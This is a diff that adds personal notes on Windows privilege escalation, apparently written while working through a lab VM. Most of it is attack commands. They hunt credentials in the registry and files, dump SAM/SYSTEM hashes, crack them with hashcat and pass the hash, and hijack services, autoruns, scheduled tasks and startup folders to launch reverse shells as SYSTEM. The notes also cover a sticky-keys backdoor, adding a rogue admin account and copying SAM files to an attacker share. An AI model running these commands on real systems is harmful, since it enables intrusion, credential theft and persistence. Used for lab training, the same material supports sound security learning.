@@ -1,0 +1,480 @@
+Windows Privilege Escalation:
+Reference:
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+
+
+Basic Enumeration:
+
+
+echo %username%
+This cmd will give the current username.
+
+whoami /priv
+This cmd will show all the privileges the user has.
+
+systeminfo
+This cmd will give all information about the system, inclduing host name,os name etc.
+
+net users
+This cmd will show all the registered users.
+
+net users <username>
+This cmd will give more info about the specific user.
+
+net users Administrator
+This cmd will give more info about the admin user.
+
+net share
+This cmd will show all the shares.
+
+ipconfig /all
+This cmd gives more indepth info than ipconfig.
+
+arp -a 
+This cmd will show the arp table.
+
+route print
+This cmd will give the default route.
+
+
+Netsh is a command-line scripting utility that allows you to display or modify the network configuration of a computer that is currently running./
+
+netsh advfirewall show
+This cmd will show all advfirewall options.
+
+netstat -ano
+The command netstat -ano lists all open ports and active connections numerically, including process ID.
+-----------------------------------------------------------------------------------------------
+
+
+Windows Management Instrumentation:
+A Windows feature that provides a standardized way for software and administrative scripts to request information about the state of your Windows operating system and data on it
+
+wmic /? 
+This cmd will give more options about wmic queries.
+
+wmic bios list
+This cmd gives bios detials.
+
+wmic bios list /format
+/format will give output in an organised format.
+
+wmic cpu /?
+This will give cpu indepth details.
+
+wmic cpu Architecture
+This cmd will show only the specific column details. you can specify more using commas
+
+wmic netlogin list /format
+This will give netlogin details
+
+wmic nic list /format
+This will give nic details.
+
+wmic nic list /format:hform
+This will give the output in html format
+
+wmic nic list /format:xml
+This will give the output in xml format
+
+wmic nic list /format:hform > temp.html
+You can also save it to a file.
+--------------------------------------------------------------------------------------------------
+
+
+AlwaysInstallElevated:
+
+Enter "gpedit.msc" in Run.
+Goto User Configuration --> Administrative Templates --> Windows Components --> Windows Installer
+Enable "Always install with elevated privileges"
+Do the same for "Computer Configuration"
+
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+Run the above cmds.
+YOu will get 1 as output, which means you can run any msi files with higher privilege.
+
+
+You can also use metasploit.
+exploit/windows/local/always_install_elevated 
+This exploit is used to enable always install elevated.
+
+First get meterpreter shell.
+Then run exploit/windows/local/always_install_elevated 
+With this you can escalate privileges.
+Try with whoami. It will how NT authority which is admin.
+--------------------------------------------------------------------------------------------------
+
+
+Search for Credentials:
+
+dir unattend.* /s
+Run this cmd to find all unattend files. Run this in root directory "/".
+These unattend files may contain some credentials.
+
+dir sysprep.* /s
+These sysprep files may contain some credentials or sensitive info.
+
+findstr /si "password" *.txt *.ini
+This cmd will search all txt and ini files for the specific string ("password").
+/s for recursive
+/i for ignore case. Means it search for both upper and lower.
+
+
+#VNC
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+
+# Windows autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+# SNMP Parameters
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+
+# Putty
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+
+# Search for password in registry
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+-------------------------------------------------------------------------------------------------
+
+
+at command:
+You can use the at command to schedule a command, a script, or a program to run at a specified date and time.To use the at command, the Task Scheduler service must be running, and you must be logged on as a member of the local Administrators group
+
+at /?
+Run this cmd to see more options about at cmd.
+
+at 10:22 .\pwn.exe
+This cmd executes the pwn.exe file at 10:22.
+
+at
+This cmd shows all the active scheduled jobs.
+
+at /delete 
+This cmd will delete all the current jobs
+
+net user /add username pass
+This is the syntax to add new user.
+
+net user /add terminator terminator
+This cmd will create a new user.
+
+net localgroup administrator /add terminator 
+This cmd will add the specific user to administrator group.
+
+
+Sticky Keys:
+Go to windows/system32
+And search for sethc binary.
+sethc will get triggered when you press SHIFT key 5times.
+So you can replace the sethc file with a reverse shell file.
+Then the reverse shell will get executed when you press SHIFT key 5times.
+--------------------------------------------------------------------------------------------------
+
+
+Metasploit Modules for Windows Post Exploitation:
+
+
+VM Check:
+First get meterpreter session in background.
+Now got multi/handler and search "checkvm".
+use post/windows/gather/checkvm
+Set the session in show options.
+Now run.
+This will show you if the machine is Vm or not.
+
+Enumerate Applications:
+search enum_applications.
+set session and run.
+This will show all applications and updates regarding the machine.
+
+Enumerate Internet Explorer:
+search enum_ie.
+set session and run.
+This will give you the Internet explorer history and cookies details.
+And will save it in a txt file.
+
+enum_chrome
+enum_snmp
+enum_shares
+enum_logged_on_users
+local_exploit_suggester
+service_permissions
+gpp
+
+Try all of these.
+----------------------------------------------------------------------------------------------
+
+
+Windows Registry:
+The Windows registry is a centralized, hierarchical database that manages resources and stores configuration settings for applications on the Windows operating system.
+Enter regedit in Run.
+
+There are 5 keys in the registry.
+This registry edit will save all the settings such as our wallpaper, taskbar setting etc.
+When we start our computer, the configuration settings will be loaded from the Registry.
+
+Data Types:
+REG_SZ : this data type stores common ascii characters.
+
+REG_BINARY : this data type stores data in the form of 0's and 1's but regedit shows us in hex format for our convenience.
+
+REG_DWORD : this data type stores data in the form of 4bytes that means 32bits. Generally it is used to store boolean values.
+
+REG_EXPAND_SZ : this data type stores string like a file path. when parsed by application it parses it as file path.
+
+REG_MULTI_SZ : this stores multiple strings as one string. Each string is separated by NULL byte \x00.
+
+ 
+Export registry File:
+Now open cmd as Administrator.
+reg save hklm\sam c:\sam
+Enter the above cmd to save the sam file.
+
+reg save hklm\system c:\system
+Enter the above cmd to save the system file.
+
+Now copy sam and system file to Pwdump folder.
+Then open cmd as Administrator and run the pwdump.exe
+Now you got the password hashes.
+Copy the hash and got crackstation.net.
+And now crack hashes.
+You got the password.
+-----------------------------------------------------------------------------------------------
+
+
+Insecure service permissions:
+
+C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
+
+accesschk is a command line utitlity to check privilges on your systems. It is a Microsoft Sysinternals tool.
+/accepteula is to tell the program that you accept the EULA, and not to display a popup window, as we are using cli. 
+-u is to suppress errors.
+-w is to show only objects that have write access.
+-c is the name of the service.
+-q is to ignore banners.
+-v is for verbose.
+user is the username.
+daclsvc is the service name.
+
+Note that the "user" account has the permission to change the service config(SERVICE_CHANGE_CONFIG).
+
+Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME). If service start name is there means it have system privileges.
+sc qc daclsvc
+sc qc command queries the configuration information for a specified service.
+
+sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+Here we are changing the service executable file path to our payload file.
+sc config command is used to modify the value of service's entries in registry and in Service Control Manager Database.
+
+Now goto kali machine and start nc listener.
+
+Now start the service.
+net start daclsvc
+The net start command is used to start a network service or list running network services.
+
+-------------------------------------------------------------------------------------------------
+
+
+Weak Registry Permissions:
+
+Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).
+sc qc regsvc
+
+Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users). So any user can write:
+C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+
+Overwrite the ImagePath registry key to point to the reverse.exe executable you created:
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+
+Now goto kali machine and start nc listener.
+
+Now start the service.
+net start regsvc
+------------------------------------------------------------------------------------------------
+
+
+Insecure Service executables:
+
+Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).
+sc qc filepermsvc
+
+Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:
+C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+
+Copy the reverse.exe executable you created and replace the filepermservice.exe with it:
+copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
+
+Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
+net start filepermsvc
+--------------------------------------------------------------------------------------------------
+
+
+Registry AutoRuns:
+
+Query the registry for AutoRun executables:
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:
+C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+
+Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:
+copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
+
+Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!
+
+rdesktop 10.10.85.41
+----------------------------------------------------------------------------------------------
+
+
+Passwords Registry:
+
+The registry can be searched for keys and values that contain the word "password":
+reg query HKLM /f password /t REG_SZ /s
+/f is to search for a specific data.
+/s is for recursive.
+
+If you want to save some time, query this specific key to find admin AutoLogon credentials:
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):
+
+winexe -U 'admin%password' //10.10.85.41 cmd.exe
+-----------------------------------------------------------------------------------------------
+
+
+Passwords Saved Creds:
+
+List any saved credentials:
+cmdkey /list
+CmdKey utility helps you manage username and passwords.
+
+Note that credentials for the "admin" user are saved. If they aren't, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.
+
+runas command with the /savecred switch, which saves the password.
+Note that using /savecred could be considered a security hole – a standard user will be able to use the runas /savecred command to run any command as administrator without entering a password
+
+Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+----------------------------------------------------------------------------------------------
+
+
+
+Passwords - Security Account Manager:
+
+The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory.
+
+Transfer the SAM and SYSTEM files to your Kali VM:
+copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
+copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
+
+On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:
+
+git clone https://github.com/Tib3rius/creddump7
+pip3 install pycrypto
+python3 creddump7/pwdump.py SYSTEM SAM
+
+Crack the admin NTLM hash using hashcat:
+hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
+
+You can use the cracked password to log in as the admin using winexe or RDP.
+-------------------------------------------------------------------------------------------------
+
+
+Passing the Hash:
+Why crack a password hash when you can authenticate using the hash?
+
+Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:
+
+pth-winexe -U 'admin%hash' //10.10.196.63 cmd.exe
+-------------------------------------------------------------------------------------------------
+
+
+Scheduled Tasks:
+
+
+View the contents of the C:\DevTools\CleanUp.ps1 script:
+type C:\DevTools\CleanUp.ps1
+
+The script seems to be running as SYSTEM every minute. Using accesschk.exe, note that you have the ability to write to this file:
+C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+
+Start a listener on Kali and then append a line to the C:\DevTools\CleanUp.ps1 which runs the reverse.exe executable you created:
+echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+
+Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.
+--------------------------------------------------------------------------------------------------
+
+
+Insecure GUI apps:
+
+
+Start an RDP session as the "user" account:
+rdesktop -u user -p password321 10.10.196.63
+
+Double-click the "AdminPaint" shortcut on your Desktop. Once it is running, open a command prompt and note that Paint is running with admin privileges:
+tasklist /V | findstr mspaint.exe
+
+In Paint, click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe  in the path.
+
+Press Enter to spawn a command prompt running with admin privileges.
+-------------------------------------------------------------------------------------------------
+
+
+Writing permmision in Startup directory:
+
+
+Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:
+C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+
+Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:
+cscript C:\PrivEsc\CreateShortcut.vbs
+
+Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:
+rdesktop -u admin 10.10.196.63
+
+A shell running as admin should connect back to your listener.
+----------------------------------------------------------------------------------------------
+
+
+Kernal Exploits:
+https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
+Run the windows-exploit-suggester.
+
+Now goto to the target machine and run systeminfo cmd in cmdprompt.
+And save the results to a file.
+
+python2 windows-exploit-suggester.py --update
+python2 windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo sysinfo.txt
+Run the above commands.
+
+This will give you exploits.
+----------------------------------------------------------------------------------------------
+
+Powershell UAC Bypass:
+search google : )
+
+WINPEAS script:
+
+_-----------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
